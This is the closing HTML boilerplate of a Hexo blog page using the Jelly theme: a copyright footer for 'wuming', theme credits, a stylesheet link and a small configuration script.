        &copy; 2023 wuming
      </div>
        <div class="footer-right">
          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/preccrep/hexo-theme-jelly" target="_blank">Jelly</a>
        </div>
    </div>
  </div>
</footer>
    </div>
    
  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">



<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: false,
		animate: true,
		isHome: false,
		isPost: true,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>

<script src="/js/main.js"></script>




  </div>
</body>
</html>